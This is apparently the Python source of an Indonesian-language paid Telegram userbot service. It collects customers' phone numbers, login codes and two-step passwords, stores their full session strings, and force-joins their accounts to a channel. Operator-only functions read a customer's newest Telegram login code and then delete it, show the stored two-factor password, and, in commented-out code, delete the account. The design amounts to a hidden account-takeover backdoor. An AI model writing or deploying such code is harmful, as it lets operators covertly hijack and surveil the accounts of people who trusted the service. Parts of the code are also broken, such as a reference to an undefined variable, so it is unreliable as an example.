import asyncio
import importlib
from datetime import datetime, timedelta

from dateutil.relativedelta import relativedelta

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *

from ubot import *
from ubot.core.database import *

async def perhatian(user):
    await bot.send_photo(user.id, "AgACAgUAAxkBAAIQLWbHOXuIbfZyuKGq1Bj56Al0l9nLAALVvTEbdz44VtYm6aLeWDVCAAgBAAMCAANzAAceBA", caption="Pastikan anda tekan 'Yes', jika terjadi pengeluaran akun secara tiba tiba bukan tanggung jawab kami")

async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if len(ubot._ubot) > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("Tutup", callback_data="0_cls")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            f"""
<b>❌ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ !</b>

<b>📚 ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇɴᴄᴀᴘᴀɪ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴅɪ ᴛᴇɴᴛᴜᴋᴀɴ : {len(ubot._ubot)}</b>

<b>👮‍♂ sɪʟᴀᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ . </b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("➡️ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="bayar_dulu")],
            [InlineKeyboardButton("❌ ʙᴀᴛᴀʟᴋᴀɴ", callback_data=f"home {user_id}")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        await buatbot(client, callback_query)


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    await callback_query.message.delete()
    return await bot.send_message(
        user_id,
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def buatbottol(client, message):
    user_id = message.from_user.id
    PREM_ID = await get_prem()  # Mendapatkan daftar ID pengguna premium
    print(f"User ID: {user_id}")
    print(f"PREM_ID: {PREM_ID}")

    # Memeriksa apakah user_id adalah bagian dari daftar premium
    if user_id not in PREM_ID:
        beli = InlineKeyboardMarkup(
            [[InlineKeyboardButton("Order Bot", callback_data="start_payment")]]
        )
        return await message.reply(
            "👋🏻 Halo kak silahkan order untuk membuat <b>Reload Your Bot</b>",
            reply_markup=beli,
        )
    try:
        contact_button = KeyboardButton("Kirim Nomor", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
        phone = await client.ask(
            user_id,
            "Silakan kirim nomor telepon Anda dengan mengklik tombol di bawah ini.",
            reply_markup=reply_markup,
            timeout=500,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    phone_number = phone.contact.phone_number
    new_client = Ubot(
        name=str(message.chat.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    
    get_otp = await client.send_message(
        user_id, "<i>Mengirim kode OTP...</i>", reply_markup=ReplyKeyboardRemove()
    )
    
    await new_client.connect()
    
    try:
        code = await new_client.send_code(phone_number)
    except (FloodWait, ApiIdInvalid, PhoneNumberInvalid, PhoneNumberFlood, PhoneNumberBanned, PhoneNumberUnoccupied) as e:
        await get_otp.delete()
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except Exception as error:
        await get_otp.delete()
        return await client.send_message(
            user_id, f"<b>ERROR:</b> {error}\n\nSilahkan ketik ulang /buatbot"
        )
    
    try:
        await get_otp.delete()
        otp = await client.ask(
            user_id,
            (
                "OTP telah dikirim melalui aplikasi <a href=tg://openmessage?user_id=777000>Telegram</a>. Silakan masukkan OTP dalam format <code>1 2 3 4 5</code>.  <i>(Spasi di antara setiap angka!)</i>"
            ),
            timeout=300,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    otp_code = otp.text
    
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except (PhoneCodeInvalid, PhoneCodeExpired, BadRequest) as e:
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await client.ask(
                user_id,
                "Akun Anda mengaktifkan verifikasi dua langkah.\nSilahkan masukkan kata sandi Anda.",
                timeout=300,
            )
        except TimeoutError:
            return await client.send_message(user_id, "Batas waktu tercapai 5 menit.")
        
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
        except Exception as error:
            return await client.send_message(user_id, f"<b>Error:</b> {error}")
    
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    await new_client.start()
    # Menambahkan ke database
    await add_ubot(
        user_id=user_id,
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ ᴅɪ ᴀᴋᴜɴ :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nᴛᴜɴɢɢᴜ sᴇʟᴀᴍᴀ 𝟷-𝟻 ᴍᴇɴɪᴛ ᴜɴᴛᴜᴋ ᴍᴇɴɢɪɴsᴛᴀʟʟ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅᴀ.</b>"
    await bot.send_message(user_id, text_done)
    await install_my_peer(new_client)
    try:
        await new_client.join_chat("yanto_ubot")
    except UserAlreadyParticipant:
        pass
    return await bot.send_message(
        LOG_UBOT,
        f"""
<b>❏ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
<b> ├ ᴀᴋᴜɴ :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ɪᴅ :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                        callback_data=f"cek_masa_aktif {user_id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    await perhatian(callback_query.from_user)

async def buatbot(client, callback_query):
    user_id = callback_query.from_user.id
    PREM_ID = await get_prem()  # Mendapatkan daftar ID pengguna premium
    print(f"User ID: {user_id}")
    print(f"PREM_ID: {PREM_ID}")

    # Memeriksa apakah user_id adalah bagian dari daftar premium
    if user_id not in PREM_ID:
        beli = InlineKeyboardMarkup(
            [[InlineKeyboardButton("Order Bot", callback_data="start_payment")]]
        )
        return await callback_query.reply(
            "👋🏻 Halo kak silahkan order untuk membuat <b>ReloadYourBot</b>",
            reply_markup=beli,
        )
    try:
        contact_button = KeyboardButton("Kirim Nomor", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
        phone = await client.ask(
            user_id,
            "Silakan kirim nomor telepon Anda dengan mengklik tombol di bawah ini.",
            reply_markup=reply_markup,
            timeout=500,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    phone_number = phone.contact.phone_number
    new_client = Ubot(
        name=str(callback_query.from_user.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    
    get_otp = await client.send_message(
        user_id, "<i>Mengirim kode OTP...</i>", reply_markup=ReplyKeyboardRemove()
    )
    
    await new_client.connect()
    
    try:
        code = await new_client.send_code(phone_number)
    except (FloodWait, ApiIdInvalid, PhoneNumberInvalid, PhoneNumberFlood, PhoneNumberBanned, PhoneNumberUnoccupied) as e:
        await get_otp.delete()
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except Exception as error:
        await get_otp.delete()
        return await client.send_message(
            user_id, f"<b>ERROR:</b> {error}\n\nSilahkan ketik ulang /buatbot"
        )
    
    try:
        await get_otp.delete()
        otp = await client.ask(
            user_id,
            (
                "OTP telah dikirim melalui aplikasi <a href=tg://openmessage?user_id=777000>Telegram</a>. Silakan masukkan OTP dalam format <code>1 2 3 4 5</code>.  <i>(Spasi di antara setiap angka!)</i>"
            ),
            timeout=300,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    otp_code = otp.text
    
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except (PhoneCodeInvalid, PhoneCodeExpired, BadRequest) as e:
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await client.ask(
                user_id,
                "Akun Anda mengaktifkan verifikasi dua langkah.\nSilahkan masukkan kata sandi Anda.",
                timeout=300,
            )
        except TimeoutError:
            return await client.send_message(user_id, "Batas waktu tercapai 5 menit.")
        
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
        except Exception as error:
            return await client.send_message(user_id, f"<b>Error:</b> {error}")
    
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    
    new_client.storage.session_string = session_string
    new_client.in_memory = False

    await new_client.start()
    # Menambahkan ke database
    await add_ubot(
        user_id=user_id,
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ ᴅɪ ᴀᴋᴜɴ :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nᴛᴜɴɢɢᴜ sᴇʟᴀᴍᴀ 𝟷-𝟻 ᴍᴇɴɪᴛ ᴜɴᴛᴜᴋ ᴍᴇɴɢɪɴsᴛᴀʟʟ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅᴀ.</b>"
    await bot.send_message(user_id, text_done)
    await install_my_peer(new_client)
    try:
        await new_client.join_chat("yanto_ubot")
    except UserAlreadyParticipant:
        pass
    return await bot.send_message(
        LOG_UBOT,
        f"""
<b>❏ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
<b> ├ ᴀᴋᴜɴ :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ɪᴅ :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    await perhatian(callback_query.from_user)

async def buat_malih(client, callback_query):
    user_id = callback_query.from_user.id
    PRIVE_DATA = await get_priv()  # Mendapatkan daftar ID pengguna premium

    # Memeriksa apakah user_id adalah bagian dari daftar premium
    if user_id not in PRIVE_DATA:
        beli = InlineKeyboardMarkup(
            [[InlineKeyboardButton("Order Bot", callback_data="start_payment")]]
        )
        return await callback_query.reply(
            "👋🏻 Halo kak silahkan order untuk membuat <b>Reload Your Bot</b>",
            reply_markup=beli,
        )
    try:
        contact_button = KeyboardButton("Kirim Nomor", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
        phone = await client.ask(
            user_id,
            "Silakan kirim nomor telepon Anda dengan mengklik tombol di bawah ini.",
            reply_markup=reply_markup,
            timeout=500,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    phone_number = phone.contact.phone_number
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    
    get_otp = await client.send_message(
        user_id, "<i>Mengirim kode OTP...</i>", reply_markup=ReplyKeyboardRemove()
    )
    
    await new_client.connect()
    
    try:
        code = await new_client.send_code(phone_number)
    except (FloodWait, ApiIdInvalid, PhoneNumberInvalid, PhoneNumberFlood, PhoneNumberBanned, PhoneNumberUnoccupied) as e:
        await get_otp.delete()
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except Exception as error:
        await get_otp.delete()
        return await client.send_message(
            user_id, f"<b>ERROR:</b> {error}\n\nSilahkan ketik ulang /buat_malih"
        )
    
    try:
        await get_otp.delete()
        otp = await client.ask(
            user_id,
            (
                "OTP telah dikirim melalui aplikasi <a href=tg://openmessage?user_id=777000>Telegram</a>. Silakan masukkan OTP dalam format <code>1 2 3 4 5</code>.  <i>(Spasi di antara setiap angka!)</i>"
            ),
            timeout=300,
        )
    except TimeoutError:
        return await client.send_message(user_id, "Waktu telah habis")

    otp_code = otp.text
    
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except (PhoneCodeInvalid, PhoneCodeExpired, BadRequest) as e:
        return await client.send_message(user_id, f"<b>ERROR:</b> {e}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await client.ask(
                user_id,
                "Akun Anda mengaktifkan verifikasi dua langkah.\nSilahkan masukkan kata sandi Anda.",
                timeout=300,
            )
        except TimeoutError:
            return await client.send_message(user_id, "Batas waktu tercapai 5 menit.")
        
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
        except Exception as error:
            return await client.send_message(user_id, f"<b>Error:</b> {error}")
    
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    
    new_client.storage.session_string = session_string
    new_client.in_memory = False

    await new_client.start()
    # Menambahkan ke database
    await add_ubot(
        user_id=user_id,
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ ᴅɪ ᴀᴋᴜɴ :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nᴛᴜɴɢɢᴜ sᴇʟᴀᴍᴀ 𝟷-𝟻 ᴍᴇɴɪᴛ ᴜɴᴛᴜᴋ ᴍᴇɴɢɪɴsᴛᴀʟʟ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅᴀ.</b>"
    await bot.send_message(user_id, text_done)
    await install_my_peer(new_client)
    try:
        await new_client.join_chat("yanto_ubot")
    except UserAlreadyParticipant:
        pass
    return await bot.send_message(
        LOG_UBOT,
        f"""
<b>❏ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
<b> ├ ᴀᴋᴜɴ :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ɪᴅ :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    await perhatian(callback_query.from_user)


async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.userbot(ubot._ubot[count].me.id, count)
        ),
    )

async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if user_id not in USER_ID:
        return await callback_query.answer(
            f"❌ ᴊᴀɴɢᴀɴ ᴅɪ ᴋʟɪᴋ ᴍᴇᴍᴇᴋ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
                else:
                    print(otp.text)
                    await callback_query.edit_message_text(
                        "Berhasil",
                        reply_markup=InlineKeyboardMarkup(
                            Button.userbot(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴘᴇɴɢɢᴜɴᴀ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ : <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
###
    elif query[0] == "ub_deak":
        return
    elif query[0] == "deak_akun":
        return

###
"""
        await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1])))
        )
"""
####

"""
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            f""
<b>❏ ᴘᴇɴᴛɪɴɢ !! </b>
<b>├ ᴀᴋᴜɴ :</b> <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
<b>├ ɪᴅ :</b> <code>{X.me.id}</code>
<b>╰ ᴀᴋᴜɴ ʙᴇʀʜᴀsɪʟ ᴅɪ ʜᴀᴘᴜs</b>
"",
            reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[1]))),
)"""
####

async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
    )


async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
    except:
        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)

async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in USER_ID:
        return await callback_query.answer(
            f"❌ ᴊᴀɴɢᴀɴ ᴅɪ ᴋʟɪᴋ ᴍᴇᴍᴇᴋ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await bot.send_message(
                OWNER_ID, f"<b> ✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ</b>"
            )
            return await bot.send_message(
                X.me.id, "<b>💬 ᴍᴀsᴀ ᴀᴋᴛɪꜰ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ʙᴇʀᴀᴋʜɪʀ"
            )



async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<b>ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs !</b>"
        )
        return True
    return False
